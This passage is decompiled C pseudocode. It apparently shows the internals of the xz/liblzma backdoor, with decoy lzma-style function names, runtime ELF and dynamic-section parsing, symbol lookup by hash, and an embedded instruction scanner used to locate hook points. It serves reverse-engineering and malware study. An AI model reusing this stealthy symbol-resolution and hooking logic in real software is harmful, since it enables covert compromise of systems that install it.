  _DWORD *v13; // r14
  __int64 v15[8]; // [rsp+18h] [rbp-40h] BYREF

  v15[0] = 0LL;
  if ( a2 )
  {
    for ( i = a1; a4 < i && !(unsigned int)sub_B00(i, a5, v15, a6); i = (_DWORD *)((char *)i - 1) )
      ;
    v10 = v15[0];
    if ( !v15[0] || (_DWORD *)v15[0] == a4 && !(unsigned int)sub_B00(a4, a5, 0LL, a6) )
      return 0LL;
    *a2 = v10;
  }
  v12 = (_DWORD *)((char *)a1 + 1);
  v13 = (_DWORD *)(a5 - 4);
  if ( a3 )
  {
    while ( v12 < v13 )
    {
      if ( (unsigned int)sub_B00(v12, a5, 0LL, a6) )
        goto LABEL_19;
      v12 = (_DWORD *)((char *)v12 + 1);
    }
    if ( v13 != v12 || (unsigned int)sub_B00(v12, a5, 0LL, a6) )
LABEL_19:
      a5 = (unsigned __int64)v12;
    *a3 = a5;
  }
  return 1LL;
}
// B90: using guessed type __int64 var_40[8];

//----- (0000000000000C80) ----------------------------------------------------
__int64 __fastcall Llzma_optimum_normal_0(unsigned __int64 a1, unsigned __int64 a2, __int64 a3, char *a4)
{
  char *v8; // rdi
  __int64 i; // rcx
  char v10[128]; // [rsp+8h] [rbp-80h] BYREF

  if ( apply_one_entry_ex(0LL, 0x81u, 4u, 7u) )
  {
    v8 = v10;
    for ( i = 22LL; i; --i )
    {
      *(_DWORD *)v8 = 0;
      v8 += 4;
    }
    if ( !a4 )
      a4 = v10;
    while ( a1 < a2 )
    {
      if ( (unsigned int)code_dasm(a4, a1, a2) )
      {
        if ( *((_DWORD *)a4 + 10) == 360 && (!a3 || *(_QWORD *)a4 + *((_QWORD *)a4 + 7) + *((_QWORD *)a4 + 1) == a3) )
          return 1LL;
        a1 += *((_QWORD *)a4 + 1);
      }
      else
      {
        ++a1;
      }
    }
  }
  return 0LL;
}

//----- (0000000000000D30) ----------------------------------------------------
__int64 __fastcall Llzma_filters_update_0(unsigned __int64 a1, unsigned __int64 a2, int a3, int a4, char *a5)
{
  __int64 v7; // rcx
  char *v8; // rbp
  char *v10; // rdi
  int v11; // eax
  char v14[128]; // [rsp+8h] [rbp-80h] BYREF

  v7 = 22LL;
  v8 = a5;
  v10 = v14;
  while ( v7 )
  {
    *(_DWORD *)v10 = 0;
    v10 += 4;
    --v7;
  }
  if ( !a5 )
    v8 = v14;
  while ( 1 )
  {
    while ( 1 )
    {
      if ( a1 >= a2 )
        return 0LL;
      if ( (unsigned int)code_dasm(v8, a1, a2) )
        break;
      ++a1;
    }
    if ( (*((_DWORD *)v8 + 7) & 0xFF00FF00) == 83886080 && (((v8[27] & 0x48) == 72) == a3 || !a4) )
    {
      v11 = *((_DWORD *)v8 + 10);
      if ( v11 == 269 )
        break;
      if ( a4 ? v11 == 267 : v11 == 265 )
        break;
    }
    a1 += *((_QWORD *)v8 + 1);
  }
  return 1LL;
}

//----- (0000000000000DF0) ----------------------------------------------------
__int64 __fastcall Llzma_filters_update_1(unsigned __int64 a1, unsigned __int64 a2, int a3, int a4, char *a5)
{
  __int64 v7; // rcx
  char *v8; // rbp
  char *v10; // rdi
  int v11; // eax
  char v14[128]; // [rsp+8h] [rbp-80h] BYREF

  v7 = 22LL;
  v8 = a5;
  v10 = v14;
  while ( v7 )
  {
    *(_DWORD *)v10 = 0;
    v10 += 4;
    --v7;
  }
  if ( !a5 )
    v8 = v14;
  while ( 1 )
  {
    while ( 1 )
    {
      if ( a1 >= a2 )
        return 0LL;
      if ( (unsigned int)code_dasm(v8, a1, a2) )
        break;
      ++a1;
    }
    if ( (*((_DWORD *)v8 + 7) & 0xFF00FF00) == 83886080 && (((v8[27] & 0x48) == 72) == a3 || !a4) )
    {
      v11 = *((_DWORD *)v8 + 10);
      if ( a4 ? v11 == 267 : v11 == 265 )
        break;
    }
    a1 += *((_QWORD *)v8 + 1);
  }
  return 1LL;
}

//----- (0000000000000EA0) ----------------------------------------------------
__int64 __fastcall Llzma_raw_encoder_0(unsigned __int64 a1, unsigned __int64 a2, __int64 a3)
{
  _DWORD *v6; // rdi
  __int64 i; // rcx
  _DWORD v8[4]; // [rsp+8h] [rbp-80h] BYREF
  char v9; // [rsp+19h] [rbp-6Fh]
  int v10; // [rsp+30h] [rbp-58h]
  __int64 v11; // [rsp+38h] [rbp-50h]

  if ( (unsigned int)Llzma_index_iter_rewind_cold(0x7Cu, 5u, 6u, 0) )
  {
    v6 = v8;
    for ( i = 22LL; i; --i )
      *v6++ = 0;
    while ( a1 < a2 )
    {
      if ( (unsigned int)code_dasm(v8, a1, a2) && v10 == 269 && (v9 & 7) == 1 && (v11 == a3 || v11 == -a3) )
        return 1LL;
      ++a1;
    }
  }
  return 0LL;
}
// EA0: using guessed type _DWORD var_80[4];

//----- (0000000000000F50) ----------------------------------------------------
__int64 __fastcall Llzma_mt_block_size_1(unsigned __int64 a1, unsigned __int64 a2, char *a3, __int64 a4)
{
  char *v8; // rdi
  __int64 i; // rcx
  char v10[128]; // [rsp+8h] [rbp-80h] BYREF

  if ( (unsigned int)Llzma_index_iter_rewind_cold(0x1C8u, 0, 0x1Eu, 0) )
  {
    v8 = v10;
    for ( i = 22LL; i; --i )
    {
      *(_DWORD *)v8 = 0;
      v8 += 4;
    }
    if ( !a3 )
      a3 = v10;
    while ( a1 < a2 )
    {
      if ( (unsigned int)code_dasm(a3, a1, a2)
        && *((_DWORD *)a3 + 10) == 269
        && (a3[27] & 0x48) == 72
        && (*((_DWORD *)a3 + 7) & 0xFF00FF00) == 83886080
        && (!a4 || *((_QWORD *)a3 + 6) + *(_QWORD *)a3 + *((_QWORD *)a3 + 1) == a4) )
      {
        return 1LL;
      }
      ++a1;
    }
  }
  return 0LL;
}

//----- (0000000000001010) ----------------------------------------------------
__int64 __fastcall Lstream_encode_1(unsigned __int64 a1, unsigned __int64 a2, __int64 a3)
{
  __int64 v4; // rcx
  __int64 *v5; // rdi
  int v6; // edx
  __int64 result; // rax
  __int64 v8[12]; // [rsp+8h] [rbp-60h] BYREF

  v4 = 22LL;
  v5 = v8;
  while ( v4 )
  {
    *(_DWORD *)v5 = 0;
    v5 = (__int64 *)((char *)v5 + 4);
    --v4;
  }
  v6 = Llzma_mt_block_size_1(a1, a2, (char *)v8, a3);
  result = 0LL;
  if ( v6 )
    return v8[0];
  return result;
}

//----- (0000000000001050) ----------------------------------------------------
__int64 __fastcall Llzma_properties_size_0(unsigned __int64 a1, unsigned __int64 a2, char *a3, int a4, __int64 a5)
{
  char *v10; // rdi
  __int64 i; // rcx
  char v12[128]; // [rsp+8h] [rbp-80h] BYREF

  if ( (unsigned int)Llzma_index_iter_rewind_cold(0xD6u, 4u, 0xEu, 0) )
  {
    v10 = v12;
    for ( i = 22LL; i; --i )
    {
      *(_DWORD *)v10 = 0;
      v10 += 4;
    }
    if ( !a3 )
      a3 = v12;
    while ( a1 < a2 )
    {
      if ( (unsigned int)code_dasm(a3, a1, a2)
        && *((_DWORD *)a3 + 10) == a4
        && (*((_DWORD *)a3 + 7) & 0xFF00FF00) == 83886080
        && (!a5 || (a3[17] & 1) != 0 && a5 == *((_QWORD *)a3 + 1) + *(_QWORD *)a3 + *((_QWORD *)a3 + 6)) )
      {
        return 1LL;
      }
      ++a1;
    }
  }
  return 0LL;
}

//----- (0000000000001110) ----------------------------------------------------
__int64 __fastcall Lstream_encoder_mt_init_1(unsigned __int64 a1, unsigned __int64 a2, char *a3, __int64 a4)
{
  if ( (unsigned int)Llzma_mt_block_size_1(a1, a2, a3, a4) )
    return 1LL;
  else
    return Llzma_properties_size_0(a1, a2, a3, 267, a4);
}

//----- (0000000000001160) ----------------------------------------------------
__int64 __fastcall Llzma_simple_x86_decoder_init_1(unsigned __int64 a1, unsigned __int64 a2, char *a3, __int64 a4)
{
  __int64 v5; // rcx
  char *v7; // rbx
  char *v8; // rdi
  char v10[128]; // [rsp+8h] [rbp-80h] BYREF

  v5 = 22LL;
  v7 = a3;
  v8 = v10;
  while ( v5 )
  {
    *(_DWORD *)v8 = 0;
    v8 += 4;
    --v5;
  }
  if ( !a3 )
    v7 = v10;
  while ( 1 )
  {
    if ( a1 >= a2 )
      return 0LL;
    if ( (unsigned int)code_dasm(v7, a1, a2)
      && *((_DWORD *)v7 + 10) == 259
      && (*((_DWORD *)v7 + 7) & 0xFF00FF00) == 83886080
      && (!a4 || (v7[17] & 1) != 0 && a4 == *((_QWORD *)v7 + 1) + *(_QWORD *)v7 + *((_QWORD *)v7 + 6)) )
    {
      break;
    }
    ++a1;
  }
  return 1LL;
}

//----- (0000000000001200) ----------------------------------------------------
void fake_lzma_free()
{
  ;
}

//----- (0000000000001230) ----------------------------------------------------
__int64 __fastcall process_elf_seg_next(
        struct_elf_info *elf_info,
        unsigned __int64 a2,
        unsigned __int64 a3,
        unsigned int ptflags,
        __int64 a5)
{
  Elf64_Ehdr *elf_hdr; // rcx
  unsigned __int64 v8; // r12
  unsigned __int64 v9; // rax
  __int64 i; // rdi
  elf64_phdr *phdr; // rax
  __int64 v12; // rdx
  unsigned __int64 v13; // rbx
  unsigned __int64 v14; // rdx
  __int64 result; // rax
  unsigned int v16; // [rsp+Ch] [rbp-2Ch]

  elf_hdr = elf_info->elf_hdr;
LABEL_2:
  a5 = (unsigned int)(a5 + 1);
  v8 = a2 + a3;
  if ( !a3 )
    return 1LL;
  v9 = a2 + a3;
  if ( a2 <= v8 )
    v9 = a2;
  if ( v9 >= (unsigned __int64)elf_hdr && (_DWORD)a5 != 0x3EA )
  {
    for ( i = 0LL; (unsigned int)i < (unsigned __int16)elf_info->phnum; ++i )
    {
      phdr = &elf_info->phdr_base[i];
      if ( phdr->__p_type == PT_LOAD && (ptflags & phdr->p_flags) == ptflags )
      {
        v12 = (__int64)&elf_hdr->e_ident[phdr->p_vaddr - elf_info->last_va];
        v13 = v12 + phdr->p_memsz;
        v14 = v12 & 0xFFFFFFFFFFFFF000LL;
        if ( (v13 & 0xFFF) != 0 )
          v13 = (v13 & 0xFFFFFFFFFFFFF000LL) + 4096;
        if ( a2 >= v14 && v13 >= v8 )
          return 1LL;
        if ( v13 < v8 || a2 >= v14 )
        {
          if ( a2 >= v13 || a2 < v14 )
          {
            if ( v13 < v8 && a2 < v14 )
            {
              v16 = a5;
              result = process_elf_seg_next(elf_info, a2, v14 - a2, ptflags, a5);
              if ( (_DWORD)result )
                return (unsigned int)process_elf_seg_next(elf_info, v13 + 1, v8 - 1 - v13, ptflags, v16) != 0;
              return result;
            }
          }
          else if ( v13 < v8 )
          {
            a2 = v13 + 1;
            a3 = v8 - (v13 + 1);
            goto LABEL_2;
          }
        }
        else if ( v14 < v8 )
        {
          a3 = v14 - a2 - 1;
          goto LABEL_2;
        }
      }
    }
  }
  return 0LL;
}

//----- (0000000000001390) ----------------------------------------------------
__int64 __fastcall process_elf_seg(struct_elf_info *a1, unsigned __int64 a2, unsigned __int64 a3, __int64 ptflags)
{
  return process_elf_seg_next(a1, a2, a3, ptflags, 0LL);
}

//----- (00000000000013A0) ----------------------------------------------------
_BOOL8 __fastcall is_gnu_relro(int a1, int a2)
{
  return a1 + a2 == 0x474E552;
}

//----- (00000000000013C0) ----------------------------------------------------
__int64 __fastcall parse_elf(Elf64_Ehdr *elf_hdr, struct_elf_info *elf_info)
{
  __int64 v4; // rcx
  __int64 *p_last_va; // rdi
  unsigned __int64 last_loadva; // r9
  unsigned int ph_i; // r13d
  __int64 phi_dyn; // rcx
  unsigned int e_phnum; // r11d
  elf64_phdr *ph_table; // r8
  elf64_phdr *hdr; // r10
  int p_type; // edi
  __int64 p_memsz; // rax
  elf64_phdr *hdr_dyn; // r8
  unsigned __int64 dyn_size; // rdx
  Elf64_Dyn *dyn_base; // r13
  union $8E3F17DF06268256B33C950219C36638::$933121F4FA1889599F702E16603DBB9F *p_d_un; // rax
  int dt_verdef_found; // edi
  unsigned __int64 d_val; // r13
  unsigned __int64 rela_siza; // r14
  unsigned __int64 PLTRELSZ; // rsi
  gnu_hash *dt_gnu_hash; // r15
  int i; // ecx
  __int64 v25; // rdx
  __int64 dtag; // rdx
  __int64 dt_audit_value; // rdx
  bool not_df_now; // zf
  __int64 JMPREL_addr; // r9
  __int64 dt_rela; // rcx
  __int64 preinit_hash; // rax
  unsigned __int64 dt_strtab; // rdx
  __int64 dt_symtab; // rdi
  __int64 dt_audit; // rax
  unsigned __int64 dt_verdef; // rax
  __int64 rela; // rsi
  __int64 preinit_hash_1; // rsi
  __int64 verdef; // rsi
  __int64 nbuckets; // rax
  int bitmask_nwords; // edx
  unsigned int symbolbase; // ecx
  int gnu_shift; // edi
  __int32 *gnu_buckets_arr; // rsi
  int dyn_length; // [rsp+0h] [rbp-2Ch]

  if ( !elf_hdr )
    return 0LL;
  if ( !elf_info )
    return 0LL;
  v4 = 62LL;
  p_last_va = &elf_info->last_va;
  last_loadva = -1LL;
  ph_i = 0;
  while ( v4 )
  {
    *(_DWORD *)p_last_va = 0;
    p_last_va = (__int64 *)((char *)p_last_va + 4);
    --v4;
  }
  elf_info->elf_hdr = elf_hdr;
  phi_dyn = -1LL;
  e_phnum = elf_hdr->e_phnum;
  ph_table = (elf64_phdr *)&elf_hdr->e_ident[elf_hdr->e_phoff];
  elf_info->phnum = e_phnum;
  elf_info->phdr_base = ph_table;
  hdr = ph_table;
  while ( ph_i < e_phnum )
  {
    p_type = hdr->__p_type;
    if ( hdr->__p_type == PT_LOAD )
    {
      if ( last_loadva > hdr->p_vaddr )
        last_loadva = hdr->p_vaddr;
    }
    else if ( p_type == PT_DYNAMIC )
    {
      phi_dyn = (int)ph_i;
    }
    else if ( is_gnu_relro(p_type, 0xA0000000) )
    {
      if ( elf_info->relo_found )
        return 0LL;
      elf_info->relo_vaddr = hdr->p_vaddr;
      p_memsz = hdr->p_memsz;
      elf_info->relo_found = 1;
      elf_info->relo_size = p_memsz;
    }
    ++ph_i;
    ++hdr;
  }
  if ( last_loadva == -1LL )
    return 0LL;
  if ( (_DWORD)phi_dyn == -1 )
    return 0LL;
  elf_info->last_va = last_loadva;
  hdr_dyn = &ph_table[phi_dyn];
  dyn_size = hdr_dyn->p_memsz;
  dyn_base = (Elf64_Dyn *)&elf_hdr->e_ident[hdr_dyn->p_vaddr - last_loadva];
  elf_info->vaddr = (__int64)dyn_base;
  elf_info->dyn_length = dyn_size >> 4;
  dyn_length = dyn_size >> 4;
  if ( !(unsigned int)process_elf_seg(elf_info, (unsigned __int64)dyn_base, dyn_size, 4LL) )
    return 0LL;
  p_d_un = &dyn_base->d_un;
  dt_verdef_found = 0;
  d_val = -1LL;
  rela_siza = -1LL;
  PLTRELSZ = -1LL;
  dt_gnu_hash = 0LL;
  for ( i = 0; dyn_length != i; ++i )
  {
    dtag = p_d_un[-1].d_val;
    if ( !dtag )                                // DT_NULL
    {
      elf_info->dyn_length = i;
      break;
    }
    if ( dtag <= 36 )
    {
      if ( dtag > DT_TEXTREL )
      {
        switch ( dtag )
        {
          case DT_JMPREL:
            elf_info->JMPREL_addr = p_d_un->d_val;
            break;
          case DT_BIND_NOW:
            goto LABEL_56;
          case DT_FLAGS:
            not_df_now = (p_d_un->d_val & 8) == 0;
            goto LABEL_55;
          case DT_EXTRANUM|DT_PREINIT_ARRAY:
            d_val = p_d_un->d_val;
            break;
          case DT_PREINIT_ARRAY|DT_HASH:
            elf_info->preinit_hash = p_d_un->d_val;
            break;
          default:
            break;
        }
      }
      else
      {
        v25 = dtag - 2;
        switch ( v25 )
        {
          case 0LL:                             // dtag == 2, DT_PLTRELSZ
            PLTRELSZ = p_d_un->d_val;
            break;
          case 3LL:                             // dtag == 5, DT_STRTAB
            elf_info->dt_strtab = p_d_un->d_val;
            break;
          case 4LL:                             // DT_SYMTAB
            elf_info->dt_symtab = p_d_un->d_val;
            break;
          case 5LL:                             // DT_RELA
            elf_info->dt_rela = p_d_un->d_val;
            break;
          case 6LL:                             // DT_RELASZ
            rela_siza = p_d_un->d_val;
            break;
          default:
            break;
        }
      }
    }
    else if ( dtag == DT_FLAGS_1 )
    {
      not_df_now = (p_d_un->d_val & 1) == 0;    // DF_1_NOW
LABEL_55:
      if ( !not_df_now )
LABEL_56:
        elf_info->dt_flags |= DF_NOW;
    }
    else if ( dtag > DT_FLAGS_1 )
    {
      switch ( dtag )
      {
        case DT_VERDEFNUM:
          dt_verdef_found = 1;
          elf_info->dt_verdefnum = p_d_un->d_val;
          break;
        case DT_HIPROC:
          return 0LL;
        case DT_VERDEF:
          elf_info->dt_verdef = p_d_un->d_val;
          break;
      }
    }
    else if ( dtag > DT_AUDIT )
    {
      if ( dtag == 0x6FFFFFF0 )
      {
        dt_audit_value = p_d_un->d_val;
        elf_info->dt_flags |= AUDIT;
        elf_info->dt_audit = dt_audit_value;
      }
    }
    else
    {
      if ( dtag > DT_CONFIG )
        return 0LL;
      if ( dtag == DT_GNU_HASH )
        dt_gnu_hash = (gnu_hash *)p_d_un->d_val;
    }
    p_d_un += 2;
  }
  JMPREL_addr = elf_info->JMPREL_addr;
  if ( JMPREL_addr )
  {
    if ( PLTRELSZ == -1LL )
      return 0LL;
    elf_info->dt_flags |= PLT;
    elf_info->plt_num = PLTRELSZ / 0x18;
  }
  dt_rela = elf_info->dt_rela;
  if ( dt_rela )
  {
    if ( rela_siza == -1LL )
      return 0LL;
    elf_info->dt_flags |= 2u;
    elf_info->rela_num = rela_siza / 0x18;
  }
  preinit_hash = elf_info->preinit_hash;
  if ( !preinit_hash )
    goto LABEL_66;
  if ( d_val == -1LL )
    return 0LL;
  elf_info->dt_flags |= PRE_INIT;
  elf_info->preinit_num = d_val >> 3;
LABEL_66:
  if ( elf_info->dt_verdef )
  {
    if ( dt_verdef_found )
      elf_info->dt_flags |= VERDEF;
    else
      elf_info->dt_verdef = 0LL;
  }
  dt_strtab = elf_info->dt_strtab;
  if ( !dt_strtab )
    return 0LL;
  dt_symtab = elf_info->dt_symtab;
  if ( !dt_gnu_hash || !dt_symtab )
    return 0LL;
  if ( (unsigned __int64)elf_hdr >= dt_strtab )
  {
    elf_info->dt_strtab = (__int64)&elf_hdr->e_ident[dt_strtab];
    elf_info->dt_symtab = (__int64)&elf_hdr->e_ident[dt_symtab];
    if ( JMPREL_addr )
      elf_info->JMPREL_addr = (__int64)&elf_hdr->e_ident[JMPREL_addr];
    if ( dt_rela )
      elf_info->dt_rela = (__int64)&elf_hdr->e_ident[dt_rela];
    if ( preinit_hash )
      elf_info->preinit_hash = (__int64)&elf_hdr->e_ident[preinit_hash];
    dt_audit = elf_info->dt_audit;
    if ( dt_audit )
      elf_info->dt_audit = (__int64)&elf_hdr->e_ident[dt_audit];
    dt_gnu_hash = (gnu_hash *)((char *)dt_gnu_hash + (_QWORD)elf_hdr);
  }
  dt_verdef = elf_info->dt_verdef;
  if ( dt_verdef && dt_verdef < (unsigned __int64)elf_hdr )
    elf_info->dt_verdef = (__int64)&elf_hdr->e_ident[dt_verdef];
  if ( elf_info->JMPREL_addr && !(unsigned int)process_elf_seg(elf_info, elf_info->JMPREL_addr, PLTRELSZ, 4LL) )
    return 0LL;
  rela = elf_info->dt_rela;
  if ( rela )
  {
    if ( !(unsigned int)process_elf_seg(elf_info, rela, rela_siza, 4LL) )
      return 0LL;
  }
  preinit_hash_1 = elf_info->preinit_hash;
  if ( preinit_hash_1 )
  {
    if ( !(unsigned int)process_elf_seg(elf_info, preinit_hash_1, d_val, 4LL) )
      return 0LL;
  }
  verdef = elf_info->dt_verdef;
  if ( verdef )
  {
    if ( !(unsigned int)process_elf_seg(elf_info, verdef, 20 * elf_info->dt_verdefnum, 4LL) )
      return 0LL;
  }
  nbuckets = (unsigned int)dt_gnu_hash->nbuckets;
  elf_info->gnu_hash_nbuckets = nbuckets;
  bitmask_nwords = dt_gnu_hash->bitmask_nwords;
  symbolbase = dt_gnu_hash->symbolbase;
  elf_info->gnu_hash_bitmask_nwords_m1 = bitmask_nwords - 1;
  gnu_shift = dt_gnu_hash->gnu_shift;
  elf_info->gnu_hash_indexbits = (__int64)&dt_gnu_hash->indexbits_len;
  gnu_buckets_arr = (__int32 *)&dt_gnu_hash->indexbits_len + (unsigned int)(2 * bitmask_nwords);
  elf_info->gnu_hash_shift = gnu_shift;
  elf_info->gnu_hash_arr = (__int64)gnu_buckets_arr;
  elf_info->gnu_hash_chains = (__int64)&gnu_buckets_arr[nbuckets - symbolbase];
  return 1LL;
}
// 1424: variable 'e_phnum' is possibly undefined
// 1435: variable 'last_loadva' is possibly undefined
// 145D: variable 'hdr' is possibly undefined
// 148A: variable 'phi_dyn' is possibly undefined
// 14A1: variable 'ph_table' is possibly undefined

//----- (0000000000001870) ----------------------------------------------------
char *__fastcall import_lookup_get_str(struct_elf_info *a1, int hash, int a3)
{
  char *v3; // r12
  unsigned int v4; // r14d
  unsigned int *v5; // r12
  __int64 v6; // r13
  char *v7; // r15
  __int16 *v8; // r13
  __int16 v9; // dx
  __int64 dt_verdef; // r13
  __int64 v11; // rax
  unsigned int *v12; // r15
  char *v13; // r15
  unsigned __int64 v15; // [rsp+8h] [rbp-40h]
  unsigned int i; // [rsp+14h] [rbp-34h]
  __int16 v18; // [rsp+1Ah] [rbp-2Eh]

  if ( (unsigned int)Llzma_index_iter_rewind_cold(0x58u, 0xFu, 3u, 0) && (!a3 || (a1->dt_flags & 0x18) == 24) )
  {
    v4 = 0;
LABEL_6:
    if ( v4 < a1->gnu_hash_nbuckets )
    {
      v5 = (unsigned int *)(a1->gnu_hash_arr + 4LL * v4);
      if ( (unsigned int)process_elf_seg(a1, (unsigned __int64)v5, 4uLL, 4LL) )
      {
        v15 = a1->gnu_hash_chains + 4LL * *v5;
        if ( (unsigned int)process_elf_seg(a1, v15, 8uLL, 4LL) )
        {
          while ( 1 )
          {
            v6 = (unsigned int)((__int64)(v15 - a1->gnu_hash_chains) >> 2);
            v3 = (char *)(a1->dt_symtab + 24 * v6);
            if ( !(unsigned int)process_elf_seg(a1, (unsigned __int64)v3, 0x18uLL, 4LL) )
              break;
            if ( *((_QWORD *)v3 + 1) && *((_WORD *)v3 + 3) )
            {
              v7 = (char *)(a1->dt_strtab + *(unsigned int *)v3);
              if ( !(unsigned int)process_elf_seg(a1, (unsigned __int64)v7, 1uLL, 4LL) )
                return 0LL;
              if ( (unsigned int)table_get(v7, 0LL) == hash )
              {
                if ( !a3 )
                  return v3;
                v8 = (__int16 *)(a1->dt_audit + 2 * v6);
                if ( !(unsigned int)process_elf_seg(a1, (unsigned __int64)v8, 2uLL, 4LL) )
                  return 0LL;
                v9 = *v8;
                if ( (a1->dt_flags & 0x18) == 24 && (v9 & 0x7FFE) != 0 )
                {
                  dt_verdef = a1->dt_verdef;
                  v18 = v9 & 0x7FFF;
                  for ( i = 0;
                        (unsigned __int64)i < a1->dt_verdefnum
                     && (unsigned int)process_elf_seg(a1, dt_verdef, 0x14uLL, 4LL)
                     && *(_WORD *)dt_verdef == 1;
                        ++i )
                  {
                    if ( v18 == *(_WORD *)(dt_verdef + 4) )
                    {
                      v12 = (unsigned int *)(dt_verdef + *(unsigned int *)(dt_verdef + 12));
                      if ( !(unsigned int)process_elf_seg(a1, (unsigned __int64)v12, 8uLL, 4LL) )
                        break;
                      v13 = (char *)(a1->dt_strtab + *v12);
                      if ( !(unsigned int)process_elf_seg(a1, (unsigned __int64)v13, 1uLL, 4LL) )
                        break;
                      if ( a3 == (unsigned int)table_get(v13, 0LL) )
                        return v3;
                    }
                    v11 = *(unsigned int *)(dt_verdef + 16);
                    if ( !(_DWORD)v11 )
                      break;
                    dt_verdef += v11;
                  }
                }
              }
            }
            v15 += 4LL;
            if ( (*(_BYTE *)(v15 - 4) & 1) != 0 )
            {
              ++v4;
              goto LABEL_6;
            }
          }
        }
      }
    }
  }
  return 0LL;
}

//----- (0000000000001AF0) ----------------------------------------------------
unsigned int *__fastcall import_lookup_ex(struct_elf_info *elfinfo, int hash)
{
  unsigned int *result; // rax
  __int64 v3; // rdx

  result = import_lookup_get_str(elfinfo, hash, 0);
  if ( result )
  {
    v3 = *((_QWORD *)result + 1);
    if ( v3 && *((_WORD *)result + 3) )
      return (unsigned int *)((char *)elfinfo->elf_hdr + v3);
    else
      return 0LL;
  }
  return result;
}

//----- (0000000000001B20) ----------------------------------------------------
unsigned __int64 __fastcall sub_1B20(unsigned __int64 a1, unsigned __int64 a2, __int64 a3)
{
  unsigned __int64 result; // rax
  __int64 v4; // rcx
  __int64 v5; // rcx

  result = a1;
  if ( a2 >= a1 || a1 >= a2 + a3 )
  {
    v5 = 0LL;
    if ( a3 )
    {
      do
      {
        *(_BYTE *)(a1 + v5) = *(_BYTE *)(a2 + v5);
        ++v5;
      }
      while ( a3 != v5 );
    }
  }
  else
  {
    v4 = a3 - 1;
    if ( a3 )
    {
      do
      {
        *(_BYTE *)(a1 + v4) = *(_BYTE *)(a2 + v4);
        --v4;
      }
      while ( v4 != -1 );
    }
  }
  return result;
}

//----- (0000000000001B70) ----------------------------------------------------
unsigned int *__fastcall Linit_pric_table_part_1(struct_elf_info *a1, __int64 a2, int a3)
{
  return import_lookup_ex(a1, a3);
}

//----- (0000000000001B80) ----------------------------------------------------
unsigned __int64 __fastcall Lstream_encoder_update_0(
        __int64 *a1,
        __int64 a2,
        unsigned __int64 a3,
        unsigned __int64 a4,
        unsigned __int64 *a5)
{
  unsigned int v5; // eax
  unsigned __int64 v8; // rdx
  __int64 v10; // r11
  unsigned __int64 v11; // rsi
  __int64 v12; // rcx
  __int64 v13; // rax
  unsigned __int64 result; // rax

  if ( (a1[26] & 2) == 0 )
    return 0LL;
  v5 = *((_DWORD *)a1 + 32);
  if ( !v5 )
    return 0LL;
  v8 = 0LL;
  if ( a5 )
    v8 = *a5;
  v10 = *a1;
  v11 = v5;
  while ( v8 < v11 )
  {
    v12 = a1[15] + 24 * v8;
    if ( *(_DWORD *)(v12 + 8) != 8 )
      goto LABEL_14;
    v13 = *(_QWORD *)(v12 + 16);
    if ( a2 )
    {
      if ( v13 != a2 - *a1 )
        goto LABEL_14;
      result = v10 + *(_QWORD *)v12;
      if ( !a3 )
        goto LABEL_18;
    }
    else
    {
      result = v10 + v13;
    }
    if ( result >= a3 && a4 >= result )
    {
LABEL_18:
      if ( a5 )
        *a5 = v8 + 1;
      return result;
    }
LABEL_14:
    ++v8;
  }
  if ( a5 )
    *a5 = v8;
  return 0LL;
}

//----- (0000000000001C20) ----------------------------------------------------
unsigned __int8 *__fastcall Lstream_encoder_update_1(
        struct_elf_info *a1,
        __int64 a2,
        unsigned __int64 a3,
        unsigned __int64 a4,
        unsigned __int64 *a5)
{
  Elf64_Ehdr *elf_hdr; // r15
  unsigned __int64 v8; // rbx
  unsigned __int64 v9; // r10
  unsigned __int8 *v10; // rsi
  unsigned __int64 v11; // r14
  unsigned __int8 *v12; // r13
  __int64 v14; // [rsp+8h] [rbp-60h]
  unsigned __int64 preinit_num; // [rsp+18h] [rbp-50h]
  unsigned __int64 v17; // [rsp+28h] [rbp-40h]
  unsigned __int64 v18; // [rsp+30h] [rbp-38h]
  unsigned __int64 v19; // [rsp+38h] [rbp-30h]

  elf_hdr = a1->elf_hdr;
  if ( (a1->dt_flags & 4) != 0 && a2 && a1->preinit_num )
  {
    v8 = 0LL;
    if ( a5 )
      v8 = *a5;
    preinit_num = (unsigned int)a1->preinit_num;
    v9 = 0LL;
    v14 = a2 - (_QWORD)elf_hdr;
    while ( v8 < preinit_num )
    {
      v10 = &elf_hdr->e_ident[v9];
      v11 = *(_QWORD *)(a1->preinit_hash + 8 * v8);
      if ( (v11 & 1) != 0 )
      {
        while ( 1 )
        {
          v11 >>= 1;
          if ( !v11 )
            break;
          if ( (v11 & 1) != 0 )
          {
            v19 = a3;
            v12 = v10;
            v18 = v9;
            if ( !(unsigned int)process_elf_seg(a1, (unsigned __int64)v10, 8uLL, 4LL) )
              return 0LL;
            v9 = v18;
            a3 = v19;
            if ( *(_QWORD *)v10 == v14 && (!v19 || v19 <= (unsigned __int64)v10 && a4 >= (unsigned __int64)v10) )
              goto LABEL_29;
          }
          v10 += 8;
        }
        v9 += 504LL;
      }
      else
      {
        v12 = &elf_hdr->e_ident[v11];
        v17 = a3;
        if ( !(unsigned int)process_elf_seg(a1, (unsigned __int64)&elf_hdr->e_ident[v11], 8uLL, 4LL) )
          return 0LL;
        a3 = v17;
        if ( *(_QWORD *)v12 == v14 && (!v17 || (unsigned __int64)v12 >= v17 && a4 >= (unsigned __int64)v12) )
        {
LABEL_29:
          if ( a5 )
            *a5 = v8 + 1;
          return v12;
        }
        v9 = v11 + 8;
      }
      ++v8;
    }
    if ( a5 )
      *a5 = v8;
  }
  return 0LL;
}

//----- (0000000000001DB0) ----------------------------------------------------
__int64 __fastcall Llz_encode_1(
        struct_elf_info *a1,
        _QWORD *JMPREL_addr,
        unsigned int plt_num,
        __int64 a4,
        int tre_hash)
{
  unsigned __int64 v5; // r15
  _BOOL4 v9; // eax
  unsigned __int64 v10; // rdx
  unsigned int *v12; // rax
  unsigned int v13; // eax
  unsigned __int64 v14; // [rsp+8h] [rbp-30h]

  v5 = plt_num;
  v9 = apply_one_entry_ex(0LL, 0x67u, 5u, 4u);
  v10 = 0LL;
  if ( v9 )
  {
    while ( v10 < v5 )
    {
      if ( (unsigned int)JMPREL_addr[1] == a4 )
      {
        v12 = (unsigned int *)(a1->dt_symtab + 24LL * HIDWORD(JMPREL_addr[1]));
        if ( !*((_WORD *)v12 + 3) )
        {
          v14 = v10;
          v13 = (unsigned int)table_get((char *)(a1->dt_strtab + *v12), 0LL);
          v10 = v14;
          if ( v13 == tre_hash )
            return (__int64)a1->elf_hdr + *JMPREL_addr;
        }
      }
      ++v10;
      JMPREL_addr += 3;
    }
  }
  return 0LL;
}

//----- (0000000000001E50) ----------------------------------------------------
